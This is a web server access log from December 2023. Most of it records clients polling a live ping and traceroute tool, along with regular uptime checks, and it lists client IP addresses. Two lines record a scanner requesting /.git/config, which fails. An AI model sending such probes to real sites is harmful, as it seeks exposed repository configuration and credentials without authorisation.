172.56.196.1 - - [19/Dec/2023:19:15:47 +0000] "GET /trace/pollping.php?id=orpk26byz HTTP/2.0" 200 2 "-" "-" 10512 "livetrace@docker" "http://172.18.0.3:80" 2ms
172.56.196.1 - - [19/Dec/2023:19:15:47 +0000] "GET /trace/polltrace.php?id=rvfv33aao HTTP/2.0" 200 301 "-" "-" 10513 "livetrace@docker" "http://172.18.0.3:80" 1ms
172.56.196.1 - - [19/Dec/2023:19:15:48 +0000] "GET /trace/pollping.php?id=orpk26byz HTTP/2.0" 200 2 "-" "-" 10514 "livetrace@docker" "http://172.18.0.3:80" 1ms
172.56.196.1 - - [19/Dec/2023:19:15:48 +0000] "GET /trace/polltrace.php?id=rvfv33aao HTTP/2.0" 200 401 "-" "-" 10515 "livetrace@docker" "http://172.18.0.3:80" 1ms
172.56.196.1 - - [19/Dec/2023:19:15:49 +0000] "GET /trace/pollping.php?id=orpk26byz HTTP/2.0" 200 2 "-" "-" 10516 "livetrace@docker" "http://172.18.0.3:80" 3ms
172.56.196.1 - - [19/Dec/2023:19:15:49 +0000] "GET /trace/polltrace.php?id=rvfv33aao HTTP/2.0" 200 401 "-" "-" 10517 "livetrace@docker" "http://172.18.0.3:80" 2ms
172.56.196.1 - - [19/Dec/2023:19:15:50 +0000] "GET /trace/pollping.php?id=orpk26byz HTTP/2.0" 200 2 "-" "-" 10518 "livetrace@docker" "http://172.18.0.3:80" 4ms
172.56.196.1 - - [19/Dec/2023:19:15:50 +0000] "GET /trace/polltrace.php?id=rvfv33aao HTTP/2.0" 200 401 "-" "-" 10519 "livetrace@docker" "http://172.18.0.3:80" 2ms
172.56.196.1 - - [19/Dec/2023:19:15:51 +0000] "GET /trace/pollping.php?id=orpk26byz HTTP/2.0" 200 2 "-" "-" 10520 "livetrace@docker" "http://172.18.0.3:80" 4ms
172.56.196.1 - - [19/Dec/2023:19:15:51 +0000] "GET /trace/polltrace.php?id=rvfv33aao HTTP/2.0" 200 442 "-" "-" 10521 "livetrace@docker" "http://172.18.0.3:80" 2ms
172.56.196.1 - - [19/Dec/2023:19:15:52 +0000] "GET /trace/pollping.php?id=orpk26byz HTTP/2.0" 200 2 "-" "-" 10522 "livetrace@docker" "http://172.18.0.3:80" 4ms
172.56.196.1 - - [19/Dec/2023:19:15:52 +0000] "GET /trace/polltrace.php?id=rvfv33aao HTTP/2.0" 200 442 "-" "-" 10523 "livetrace@docker" "http://172.18.0.3:80" 2ms
172.56.196.1 - - [19/Dec/2023:19:15:53 +0000] "GET /trace/pollping.php?id=orpk26byz HTTP/2.0" 200 2 "-" "-" 10524 "livetrace@docker" "http://172.18.0.3:80" 2ms
172.56.196.1 - - [19/Dec/2023:19:15:53 +0000] "GET /trace/polltrace.php?id=rvfv33aao HTTP/2.0" 200 442 "-" "-" 10525 "livetrace@docker" "http://172.18.0.3:80" 2ms
172.56.196.1 - - [19/Dec/2023:19:15:54 +0000] "GET /trace/pollping.php?id=orpk26byz HTTP/2.0" 200 2 "-" "-" 10526 "livetrace@docker" "http://172.18.0.3:80" 3ms
172.56.196.1 - - [19/Dec/2023:19:15:54 +0000] "GET /trace/polltrace.php?id=rvfv33aao HTTP/2.0" 200 483 "-" "-" 10527 "livetrace@docker" "http://172.18.0.3:80" 2ms
172.56.196.1 - - [19/Dec/2023:19:15:55 +0000] "GET /trace/pollping.php?id=orpk26byz HTTP/2.0" 200 2 "-" "-" 10528 "livetrace@docker" "http://172.18.0.3:80" 3ms
172.56.196.1 - - [19/Dec/2023:19:15:55 +0000] "GET /trace/polltrace.php?id=rvfv33aao HTTP/2.0" 200 483 "-" "-" 10529 "livetrace@docker" "http://172.18.0.3:80" 2ms
172.56.196.1 - - [19/Dec/2023:19:15:56 +0000] "GET /trace/polltrace.php?id=rvfv33aao HTTP/2.0" 200 483 "-" "-" 10531 "livetrace@docker" "http://172.18.0.3:80" 1ms
172.56.196.1 - - [19/Dec/2023:19:15:56 +0000] "GET /trace/pollping.php?id=orpk26byz HTTP/2.0" 200 2 "-" "-" 10530 "livetrace@docker" "http://172.18.0.3:80" 2ms
172.56.196.1 - - [19/Dec/2023:19:15:57 +0000] "GET /trace/pollping.php?id=orpk26byz HTTP/2.0" 200 2 "-" "-" 10532 "livetrace@docker" "http://172.18.0.3:80" 1ms
172.56.196.1 - - [19/Dec/2023:19:15:57 +0000] "GET /trace/polltrace.php?id=rvfv33aao HTTP/2.0" 200 524 "-" "-" 10533 "livetrace@docker" "http://172.18.0.3:80" 2ms
172.56.196.1 - - [19/Dec/2023:19:15:58 +0000] "GET /trace/pollping.php?id=orpk26byz HTTP/2.0" 200 2 "-" "-" 10534 "livetrace@docker" "http://172.18.0.3:80" 3ms
172.56.196.1 - - [19/Dec/2023:19:15:58 +0000] "GET /trace/polltrace.php?id=rvfv33aao HTTP/2.0" 200 524 "-" "-" 10535 "livetrace@docker" "http://172.18.0.3:80" 2ms
172.56.196.1 - - [19/Dec/2023:19:15:59 +0000] "GET /trace/pollping.php?id=orpk26byz HTTP/2.0" 200 4 "-" "-" 10536 "livetrace@docker" "http://172.18.0.3:80" 2ms
172.56.196.1 - - [19/Dec/2023:19:15:59 +0000] "GET /trace/polltrace.php?id=rvfv33aao HTTP/2.0" 200 524 "-" "-" 10537 "livetrace@docker" "http://172.18.0.3:80" 2ms
172.56.196.1 - - [19/Dec/2023:19:15:59 +0000] "GET /trace/cleanping.php?id=orpk26byz HTTP/2.0" 200 71 "-" "-" 10538 "livetrace@docker" "http://172.18.0.3:80" 3ms
172.56.196.1 - - [19/Dec/2023:19:16:00 +0000] "GET /trace/polltrace.php?id=rvfv33aao HTTP/2.0" 200 565 "-" "-" 10539 "livetrace@docker" "http://172.18.0.3:80" 1ms
172.56.196.1 - - [19/Dec/2023:19:16:01 +0000] "GET /trace/polltrace.php?id=rvfv33aao HTTP/2.0" 200 565 "-" "-" 10540 "livetrace@docker" "http://172.18.0.3:80" 1ms
172.56.196.1 - - [19/Dec/2023:19:16:02 +0000] "GET /trace/polltrace.php?id=rvfv33aao HTTP/2.0" 200 565 "-" "-" 10541 "livetrace@docker" "http://172.18.0.3:80" 2ms
172.56.196.1 - - [19/Dec/2023:19:16:03 +0000] "GET /trace/polltrace.php?id=rvfv33aao HTTP/2.0" 200 606 "-" "-" 10542 "livetrace@docker" "http://172.18.0.3:80" 1ms
172.56.196.1 - - [19/Dec/2023:19:16:04 +0000] "GET /trace/polltrace.php?id=rvfv33aao HTTP/2.0" 200 606 "-" "-" 10543 "livetrace@docker" "http://172.18.0.3:80" 1ms
172.56.196.1 - - [19/Dec/2023:19:16:05 +0000] "GET /trace/polltrace.php?id=rvfv33aao HTTP/2.0" 200 606 "-" "-" 10544 "livetrace@docker" "http://172.18.0.3:80" 1ms
172.56.196.1 - - [19/Dec/2023:19:16:06 +0000] "GET /trace/polltrace.php?id=rvfv33aao HTTP/2.0" 200 647 "-" "-" 10545 "livetrace@docker" "http://172.18.0.3:80" 1ms
172.56.196.1 - - [19/Dec/2023:19:16:07 +0000] "GET /trace/polltrace.php?id=rvfv33aao HTTP/2.0" 200 647 "-" "-" 10546 "livetrace@docker" "http://172.18.0.3:80" 1ms
172.56.196.1 - - [19/Dec/2023:19:16:08 +0000] "GET /trace/polltrace.php?id=rvfv33aao HTTP/2.0" 200 647 "-" "-" 10547 "livetrace@docker" "http://172.18.0.3:80" 1ms
172.56.196.1 - - [19/Dec/2023:19:16:09 +0000] "GET /trace/polltrace.php?id=rvfv33aao HTTP/2.0" 200 688 "-" "-" 10548 "livetrace@docker" "http://172.18.0.3:80" 1ms
172.56.196.1 - - [19/Dec/2023:19:16:10 +0000] "GET /trace/polltrace.php?id=rvfv33aao HTTP/2.0" 200 688 "-" "-" 10549 "livetrace@docker" "http://172.18.0.3:80" 1ms
172.56.196.1 - - [19/Dec/2023:19:16:11 +0000] "GET /trace/polltrace.php?id=rvfv33aao HTTP/2.0" 200 688 "-" "-" 10550 "livetrace@docker" "http://172.18.0.3:80" 1ms
172.56.196.1 - - [19/Dec/2023:19:16:12 +0000] "GET /trace/polltrace.php?id=rvfv33aao HTTP/2.0" 200 729 "-" "-" 10551 "livetrace@docker" "http://172.18.0.3:80" 2ms
172.56.196.1 - - [19/Dec/2023:19:16:13 +0000] "GET /trace/polltrace.php?id=rvfv33aao HTTP/2.0" 200 729 "-" "-" 10552 "livetrace@docker" "http://172.18.0.3:80" 1ms
172.56.196.1 - - [19/Dec/2023:19:16:14 +0000] "GET /trace/polltrace.php?id=rvfv33aao HTTP/2.0" 200 729 "-" "-" 10553 "livetrace@docker" "http://172.18.0.3:80" 2ms
172.56.196.1 - - [19/Dec/2023:19:16:15 +0000] "GET /trace/polltrace.php?id=rvfv33aao HTTP/2.0" 200 770 "-" "-" 10554 "livetrace@docker" "http://172.18.0.3:80" 2ms
172.56.196.1 - - [19/Dec/2023:19:16:16 +0000] "GET /trace/polltrace.php?id=rvfv33aao HTTP/2.0" 200 770 "-" "-" 10555 "livetrace@docker" "http://172.18.0.3:80" 2ms
172.56.196.1 - - [19/Dec/2023:19:16:17 +0000] "GET /trace/polltrace.php?id=rvfv33aao HTTP/2.0" 200 770 "-" "-" 10556 "livetrace@docker" "http://172.18.0.3:80" 1ms
172.56.196.1 - - [19/Dec/2023:19:16:18 +0000] "GET /trace/polltrace.php?id=rvfv33aao HTTP/2.0" 200 811 "-" "-" 10557 "livetrace@docker" "http://172.18.0.3:80" 2ms
172.56.196.1 - - [19/Dec/2023:19:16:19 +0000] "GET /trace/polltrace.php?id=rvfv33aao HTTP/2.0" 200 811 "-" "-" 10558 "livetrace@docker" "http://172.18.0.3:80" 1ms
172.56.196.1 - - [19/Dec/2023:19:16:20 +0000] "GET /trace/polltrace.php?id=rvfv33aao HTTP/2.0" 200 811 "-" "-" 10559 "livetrace@docker" "http://172.18.0.3:80" 1ms
159.203.109.206 - - [19/Dec/2023:19:16:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10560 "www@docker" "http://172.18.0.9:80" 0ms
172.56.196.1 - - [19/Dec/2023:19:16:21 +0000] "GET /trace/polltrace.php?id=rvfv33aao HTTP/2.0" 200 852 "-" "-" 10561 "livetrace@docker" "http://172.18.0.3:80" 1ms
172.56.196.1 - - [19/Dec/2023:19:16:22 +0000] "GET /trace/polltrace.php?id=rvfv33aao HTTP/2.0" 200 852 "-" "-" 10562 "livetrace@docker" "http://172.18.0.3:80" 1ms
172.56.196.1 - - [19/Dec/2023:19:16:23 +0000] "GET /trace/polltrace.php?id=rvfv33aao HTTP/2.0" 200 852 "-" "-" 10563 "livetrace@docker" "http://172.18.0.3:80" 1ms
172.56.196.1 - - [19/Dec/2023:19:16:24 +0000] "GET /trace/polltrace.php?id=rvfv33aao HTTP/2.0" 200 893 "-" "-" 10564 "livetrace@docker" "http://172.18.0.3:80" 1ms
172.56.196.1 - - [19/Dec/2023:19:16:25 +0000] "GET /trace/polltrace.php?id=rvfv33aao HTTP/2.0" 200 893 "-" "-" 10565 "livetrace@docker" "http://172.18.0.3:80" 1ms
172.56.196.1 - - [19/Dec/2023:19:16:26 +0000] "GET /trace/polltrace.php?id=rvfv33aao HTTP/2.0" 200 893 "-" "-" 10566 "livetrace@docker" "http://172.18.0.3:80" 2ms
172.56.196.1 - - [19/Dec/2023:19:16:27 +0000] "GET /trace/polltrace.php?id=rvfv33aao HTTP/2.0" 200 934 "-" "-" 10567 "livetrace@docker" "http://172.18.0.3:80" 1ms
172.56.196.1 - - [19/Dec/2023:19:16:28 +0000] "GET /trace/polltrace.php?id=rvfv33aao HTTP/2.0" 200 934 "-" "-" 10568 "livetrace@docker" "http://172.18.0.3:80" 1ms
172.56.196.1 - - [19/Dec/2023:19:16:29 +0000] "GET /trace/polltrace.php?id=rvfv33aao HTTP/2.0" 200 934 "-" "-" 10569 "livetrace@docker" "http://172.18.0.3:80" 1ms
172.56.196.1 - - [19/Dec/2023:19:16:30 +0000] "GET /trace/polltrace.php?id=rvfv33aao HTTP/2.0" 200 975 "-" "-" 10570 "livetrace@docker" "http://172.18.0.3:80" 1ms
172.56.196.1 - - [19/Dec/2023:19:16:31 +0000] "GET /trace/polltrace.php?id=rvfv33aao HTTP/2.0" 200 975 "-" "-" 10571 "livetrace@docker" "http://172.18.0.3:80" 2ms
172.56.196.1 - - [19/Dec/2023:19:16:32 +0000] "GET /trace/polltrace.php?id=rvfv33aao HTTP/2.0" 200 975 "-" "-" 10572 "livetrace@docker" "http://172.18.0.3:80" 1ms
172.56.196.1 - - [19/Dec/2023:19:16:33 +0000] "GET /trace/polltrace.php?id=rvfv33aao HTTP/2.0" 200 1016 "-" "-" 10573 "livetrace@docker" "http://172.18.0.3:80" 2ms
172.56.196.1 - - [19/Dec/2023:19:16:34 +0000] "GET /trace/polltrace.php?id=rvfv33aao HTTP/2.0" 200 1016 "-" "-" 10574 "livetrace@docker" "http://172.18.0.3:80" 1ms
167.71.120.76 - - [19/Dec/2023:19:16:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10575 "www@docker" "http://172.18.0.9:80" 1ms
172.56.196.1 - - [19/Dec/2023:19:16:35 +0000] "GET /trace/polltrace.php?id=rvfv33aao HTTP/2.0" 200 1016 "-" "-" 10576 "livetrace@docker" "http://172.18.0.3:80" 2ms
172.56.196.1 - - [19/Dec/2023:19:16:36 +0000] "GET /trace/polltrace.php?id=rvfv33aao HTTP/2.0" 200 1057 "-" "-" 10577 "livetrace@docker" "http://172.18.0.3:80" 2ms
172.56.196.1 - - [19/Dec/2023:19:16:37 +0000] "GET /trace/polltrace.php?id=rvfv33aao HTTP/2.0" 200 1057 "-" "-" 10578 "livetrace@docker" "http://172.18.0.3:80" 1ms
172.56.196.1 - - [19/Dec/2023:19:16:38 +0000] "GET /trace/polltrace.php?id=rvfv33aao HTTP/2.0" 200 1057 "-" "-" 10579 "livetrace@docker" "http://172.18.0.3:80" 2ms
172.56.196.1 - - [19/Dec/2023:19:16:39 +0000] "GET /trace/polltrace.php?id=rvfv33aao HTTP/2.0" 200 1098 "-" "-" 10580 "livetrace@docker" "http://172.18.0.3:80" 2ms
172.56.196.1 - - [19/Dec/2023:19:16:40 +0000] "GET /trace/polltrace.php?id=rvfv33aao HTTP/2.0" 200 1098 "-" "-" 10581 "livetrace@docker" "http://172.18.0.3:80" 1ms
172.56.196.1 - - [19/Dec/2023:19:16:41 +0000] "GET /trace/polltrace.php?id=rvfv33aao HTTP/2.0" 200 1098 "-" "-" 10582 "livetrace@docker" "http://172.18.0.3:80" 1ms
159.203.109.206 - - [19/Dec/2023:19:17:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10583 "www@docker" "http://172.18.0.9:80" 1ms
73.159.229.174 - - [19/Dec/2023:19:17:27 +0000] "GET /trace/polltrace.php?id=rvfv33aao HTTP/2.0" 200 1282 "-" "-" 10584 "livetrace@docker" "http://172.18.0.3:80" 34ms
73.159.229.174 - - [19/Dec/2023:19:17:27 +0000] "GET /trace/cleantrace.php?id=rvfv33aao HTTP/2.0" 200 72 "-" "-" 10585 "livetrace@docker" "http://172.18.0.3:80" 2ms
73.159.229.174 - - [19/Dec/2023:19:17:28 +0000] "GET /trace/ HTTP/2.0" 200 6082 "-" "-" 10586 "livetrace@docker" "http://172.18.0.3:80" 17ms
73.159.229.174 - - [19/Dec/2023:19:17:28 +0000] "GET /trace/styles.css?version=16 HTTP/2.0" 304 0 "-" "-" 10587 "livetrace@docker" "http://172.18.0.3:80" 1ms
73.159.229.174 - - [19/Dec/2023:19:17:32 +0000] "GET /trace/startping.php?id=rmeispsl3 HTTP/2.0" 200 105 "-" "-" 10588 "livetrace@docker" "http://172.18.0.3:80" 4ms
73.159.229.174 - - [19/Dec/2023:19:17:32 +0000] "GET /trace/starttrace.php?id=cfsw83onn HTTP/2.0" 200 106 "-" "-" 10589 "livetrace@docker" "http://172.18.0.3:80" 8ms
73.159.229.174 - - [19/Dec/2023:19:17:33 +0000] "GET /trace/pollping.php?id=rmeispsl3 HTTP/2.0" 200 36 "-" "-" 10590 "livetrace@docker" "http://172.18.0.3:80" 2ms
73.159.229.174 - - [19/Dec/2023:19:17:33 +0000] "GET /trace/polltrace.php?id=cfsw83onn HTTP/2.0" 200 1258 "-" "-" 10591 "livetrace@docker" "http://172.18.0.3:80" 2ms
73.159.229.174 - - [19/Dec/2023:19:17:34 +0000] "GET /trace/polltrace.php?id=cfsw83onn HTTP/2.0" 200 1258 "-" "-" 10593 "livetrace@docker" "http://172.18.0.3:80" 1ms
73.159.229.174 - - [19/Dec/2023:19:17:34 +0000] "GET /trace/pollping.php?id=rmeispsl3 HTTP/2.0" 200 63 "-" "-" 10592 "livetrace@docker" "http://172.18.0.3:80" 2ms
167.71.120.76 - - [19/Dec/2023:19:17:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10594 "www@docker" "http://172.18.0.9:80" 0ms
170.64.200.251 - - [19/Dec/2023:19:17:35 +0000] "GET /.git/config HTTP/1.1" 301 17 "-" "-" 10595 "web-to-websecure@internal" "-" 0ms
73.159.229.174 - - [19/Dec/2023:19:17:35 +0000] "GET /trace/pollping.php?id=rmeispsl3 HTTP/2.0" 200 91 "-" "-" 10596 "livetrace@docker" "http://172.18.0.3:80" 2ms
73.159.229.174 - - [19/Dec/2023:19:17:35 +0000] "GET /trace/polltrace.php?id=cfsw83onn HTTP/2.0" 200 1258 "-" "-" 10597 "livetrace@docker" "http://172.18.0.3:80" 4ms
73.159.229.174 - - [19/Dec/2023:19:17:36 +0000] "GET /trace/polltrace.php?id=cfsw83onn HTTP/2.0" 200 1299 "-" "-" 10599 "livetrace@docker" "http://172.18.0.3:80" 2ms
73.159.229.174 - - [19/Dec/2023:19:17:36 +0000] "GET /trace/pollping.php?id=rmeispsl3 HTTP/2.0" 200 118 "-" "-" 10598 "livetrace@docker" "http://172.18.0.3:80" 4ms
170.64.200.251 - - [19/Dec/2023:19:17:37 +0000] "GET /.git/config HTTP/1.1" 404 19 "-" "-" 10600 "-" "-" 0ms
73.159.229.174 - - [19/Dec/2023:19:17:37 +0000] "GET /trace/pollping.php?id=rmeispsl3 HTTP/2.0" 200 144 "-" "-" 10601 "livetrace@docker" "http://172.18.0.3:80" 2ms
73.159.229.174 - - [19/Dec/2023:19:17:37 +0000] "GET /trace/polltrace.php?id=cfsw83onn HTTP/2.0" 200 1299 "-" "-" 10602 "livetrace@docker" "http://172.18.0.3:80" 2ms
73.159.229.174 - - [19/Dec/2023:19:17:38 +0000] "GET /trace/pollping.php?id=rmeispsl3 HTTP/2.0" 200 172 "-" "-" 10603 "livetrace@docker" "http://172.18.0.3:80" 2ms
73.159.229.174 - - [19/Dec/2023:19:17:38 +0000] "GET /trace/polltrace.php?id=cfsw83onn HTTP/2.0" 200 1299 "-" "-" 10604 "livetrace@docker" "http://172.18.0.3:80" 2ms
73.159.229.174 - - [19/Dec/2023:19:17:39 +0000] "GET /trace/pollping.php?id=rmeispsl3 HTTP/2.0" 200 199 "-" "-" 10605 "livetrace@docker" "http://172.18.0.3:80" 2ms
73.159.229.174 - - [19/Dec/2023:19:17:39 +0000] "GET /trace/polltrace.php?id=cfsw83onn HTTP/2.0" 200 1340 "-" "-" 10606 "livetrace@docker" "http://172.18.0.3:80" 2ms
73.159.229.174 - - [19/Dec/2023:19:17:40 +0000] "GET /trace/pollping.php?id=rmeispsl3 HTTP/2.0" 200 216 "-" "-" 10607 "livetrace@docker" "http://172.18.0.3:80" 2ms
73.159.229.174 - - [19/Dec/2023:19:17:40 +0000] "GET /trace/polltrace.php?id=cfsw83onn HTTP/2.0" 200 1340 "-" "-" 10608 "livetrace@docker" "http://172.18.0.3:80" 1ms
73.159.229.174 - - [19/Dec/2023:19:17:40 +0000] "GET /trace/cleanping.php?id=rmeispsl3 HTTP/2.0" 200 71 "-" "-" 10609 "livetrace@docker" "http://172.18.0.3:80" 2ms
73.159.229.174 - - [19/Dec/2023:19:17:41 +0000] "GET /trace/polltrace.php?id=cfsw83onn HTTP/2.0" 200 1340 "-" "-" 10610 "livetrace@docker" "http://172.18.0.3:80" 2ms
73.159.229.174 - - [19/Dec/2023:19:17:42 +0000] "GET /trace/polltrace.php?id=cfsw83onn HTTP/2.0" 200 1381 "-" "-" 10611 "livetrace@docker" "http://172.18.0.3:80" 2ms
73.159.229.174 - - [19/Dec/2023:19:17:43 +0000] "GET /trace/polltrace.php?id=cfsw83onn HTTP/2.0" 200 1381 "-" "-" 10612 "livetrace@docker" "http://172.18.0.3:80" 1ms
73.159.229.174 - - [19/Dec/2023:19:17:44 +0000] "GET /trace/polltrace.php?id=cfsw83onn HTTP/2.0" 200 1381 "-" "-" 10613 "livetrace@docker" "http://172.18.0.3:80" 1ms
73.159.229.174 - - [19/Dec/2023:19:17:45 +0000] "GET /trace/polltrace.php?id=cfsw83onn HTTP/2.0" 200 1422 "-" "-" 10614 "livetrace@docker" "http://172.18.0.3:80" 3ms
73.159.229.174 - - [19/Dec/2023:19:17:46 +0000] "GET /trace/polltrace.php?id=cfsw83onn HTTP/2.0" 200 1422 "-" "-" 10615 "livetrace@docker" "http://172.18.0.3:80" 2ms
73.159.229.174 - - [19/Dec/2023:19:17:47 +0000] "GET /trace/polltrace.php?id=cfsw83onn HTTP/2.0" 200 1422 "-" "-" 10616 "livetrace@docker" "http://172.18.0.3:80" 2ms
73.159.229.174 - - [19/Dec/2023:19:17:48 +0000] "GET /trace/polltrace.php?id=cfsw83onn HTTP/2.0" 200 1463 "-" "-" 10617 "livetrace@docker" "http://172.18.0.3:80" 1ms
73.159.229.174 - - [19/Dec/2023:19:17:49 +0000] "GET /trace/polltrace.php?id=cfsw83onn HTTP/2.0" 200 1463 "-" "-" 10618 "livetrace@docker" "http://172.18.0.3:80" 1ms
73.159.229.174 - - [19/Dec/2023:19:17:50 +0000] "GET /trace/polltrace.php?id=cfsw83onn HTTP/2.0" 200 1463 "-" "-" 10619 "livetrace@docker" "http://172.18.0.3:80" 2ms
73.159.229.174 - - [19/Dec/2023:19:17:51 +0000] "GET /trace/polltrace.php?id=cfsw83onn HTTP/2.0" 200 1504 "-" "-" 10620 "livetrace@docker" "http://172.18.0.3:80" 2ms
73.159.229.174 - - [19/Dec/2023:19:17:52 +0000] "GET /trace/polltrace.php?id=cfsw83onn HTTP/2.0" 200 1504 "-" "-" 10621 "livetrace@docker" "http://172.18.0.3:80" 1ms
73.159.229.174 - - [19/Dec/2023:19:17:53 +0000] "GET /trace/polltrace.php?id=cfsw83onn HTTP/2.0" 200 1504 "-" "-" 10622 "livetrace@docker" "http://172.18.0.3:80" 2ms
73.159.229.174 - - [19/Dec/2023:19:17:54 +0000] "GET /trace/polltrace.php?id=cfsw83onn HTTP/2.0" 200 1545 "-" "-" 10623 "livetrace@docker" "http://172.18.0.3:80" 2ms
73.159.229.174 - - [19/Dec/2023:19:17:55 +0000] "GET /trace/polltrace.php?id=cfsw83onn HTTP/2.0" 200 1545 "-" "-" 10624 "livetrace@docker" "http://172.18.0.3:80" 2ms
73.159.229.174 - - [19/Dec/2023:19:17:56 +0000] "GET /trace/polltrace.php?id=cfsw83onn HTTP/2.0" 200 1545 "-" "-" 10625 "livetrace@docker" "http://172.18.0.3:80" 2ms
73.159.229.174 - - [19/Dec/2023:19:17:57 +0000] "GET /trace/polltrace.php?id=cfsw83onn HTTP/2.0" 200 1586 "-" "-" 10626 "livetrace@docker" "http://172.18.0.3:80" 1ms
73.159.229.174 - - [19/Dec/2023:19:17:58 +0000] "GET /trace/polltrace.php?id=cfsw83onn HTTP/2.0" 200 1586 "-" "-" 10627 "livetrace@docker" "http://172.18.0.3:80" 1ms
73.159.229.174 - - [19/Dec/2023:19:17:59 +0000] "GET /trace/polltrace.php?id=cfsw83onn HTTP/2.0" 200 1586 "-" "-" 10628 "livetrace@docker" "http://172.18.0.3:80" 1ms
73.159.229.174 - - [19/Dec/2023:19:18:00 +0000] "GET /trace/polltrace.php?id=cfsw83onn HTTP/2.0" 200 1627 "-" "-" 10629 "livetrace@docker" "http://172.18.0.3:80" 2ms
73.159.229.174 - - [19/Dec/2023:19:18:01 +0000] "GET /trace/polltrace.php?id=cfsw83onn HTTP/2.0" 200 1627 "-" "-" 10630 "livetrace@docker" "http://172.18.0.3:80" 1ms
73.159.229.174 - - [19/Dec/2023:19:18:02 +0000] "GET /trace/polltrace.php?id=cfsw83onn HTTP/2.0" 200 1627 "-" "-" 10631 "livetrace@docker" "http://172.18.0.3:80" 1ms
73.159.229.174 - - [19/Dec/2023:19:18:03 +0000] "GET /trace/polltrace.php?id=cfsw83onn HTTP/2.0" 200 1668 "-" "-" 10632 "livetrace@docker" "http://172.18.0.3:80" 2ms
73.159.229.174 - - [19/Dec/2023:19:18:04 +0000] "GET /trace/polltrace.php?id=cfsw83onn HTTP/2.0" 200 1668 "-" "-" 10633 "livetrace@docker" "http://172.18.0.3:80" 2ms
73.159.229.174 - - [19/Dec/2023:19:18:05 +0000] "GET /trace/polltrace.php?id=cfsw83onn HTTP/2.0" 200 1668 "-" "-" 10634 "livetrace@docker" "http://172.18.0.3:80" 1ms
73.159.229.174 - - [19/Dec/2023:19:18:06 +0000] "GET /trace/polltrace.php?id=cfsw83onn HTTP/2.0" 200 1709 "-" "-" 10635 "livetrace@docker" "http://172.18.0.3:80" 2ms
73.159.229.174 - - [19/Dec/2023:19:18:07 +0000] "GET /trace/polltrace.php?id=cfsw83onn HTTP/2.0" 200 1709 "-" "-" 10636 "livetrace@docker" "http://172.18.0.3:80" 2ms
73.159.229.174 - - [19/Dec/2023:19:18:08 +0000] "GET /trace/polltrace.php?id=cfsw83onn HTTP/2.0" 200 1709 "-" "-" 10637 "livetrace@docker" "http://172.18.0.3:80" 2ms
73.159.229.174 - - [19/Dec/2023:19:18:09 +0000] "GET /trace/polltrace.php?id=cfsw83onn HTTP/2.0" 200 1750 "-" "-" 10638 "livetrace@docker" "http://172.18.0.3:80" 1ms
73.159.229.174 - - [19/Dec/2023:19:18:10 +0000] "GET /trace/polltrace.php?id=cfsw83onn HTTP/2.0" 200 1750 "-" "-" 10639 "livetrace@docker" "http://172.18.0.3:80" 3ms
73.159.229.174 - - [19/Dec/2023:19:18:11 +0000] "GET /trace/polltrace.php?id=cfsw83onn HTTP/2.0" 200 1750 "-" "-" 10640 "livetrace@docker" "http://172.18.0.3:80" 1ms
73.159.229.174 - - [19/Dec/2023:19:18:12 +0000] "GET /trace/polltrace.php?id=cfsw83onn HTTP/2.0" 200 1791 "-" "-" 10641 "livetrace@docker" "http://172.18.0.3:80" 2ms
73.159.229.174 - - [19/Dec/2023:19:18:13 +0000] "GET /trace/polltrace.php?id=cfsw83onn HTTP/2.0" 200 1791 "-" "-" 10642 "livetrace@docker" "http://172.18.0.3:80" 1ms
73.159.229.174 - - [19/Dec/2023:19:18:14 +0000] "GET /trace/polltrace.php?id=cfsw83onn HTTP/2.0" 200 1791 "-" "-" 10643 "livetrace@docker" "http://172.18.0.3:80" 2ms
73.159.229.174 - - [19/Dec/2023:19:18:15 +0000] "GET /trace/polltrace.php?id=cfsw83onn HTTP/2.0" 200 1852 "-" "-" 10644 "livetrace@docker" "http://172.18.0.3:80" 1ms
73.159.229.174 - - [19/Dec/2023:19:18:15 +0000] "GET /trace/cleantrace.php?id=cfsw83onn HTTP/2.0" 200 72 "-" "-" 10645 "livetrace@docker" "http://172.18.0.3:80" 2ms
159.203.109.206 - - [19/Dec/2023:19:18:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10646 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:19:18:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10647 "www@docker" "http://172.18.0.9:80" 0ms
89.187.178.158 - - [19/Dec/2023:19:18:36 +0000] "GET /trace/ HTTP/2.0" 200 6074 "-" "-" 10648 "livetrace@docker" "http://172.18.0.3:80" 40ms
159.203.109.206 - - [19/Dec/2023:19:19:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10649 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:19:19:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10650 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:19:20:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10651 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:19:20:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10652 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:19:21:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10653 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:19:21:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10654 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:19:22:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10655 "www@docker" "http://172.18.0.9:80" 1ms
128.14.236.128 - - [19/Dec/2023:19:22:22 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 10656 "-" "-" 0ms
167.71.120.76 - - [19/Dec/2023:19:22:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 10657 "www@docker" "http://172.18.0.9:80" 0ms
128.14.236.128 - - [19/Dec/2023:19:22:41 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 10658 "-" "-" 0ms
128.14.236.128 - - [19/Dec/2023:19:22:42 +0000] "GET /robots.txt HTTP/1.1" 404 19 "-" "-" 10659 "-" "-" 0ms
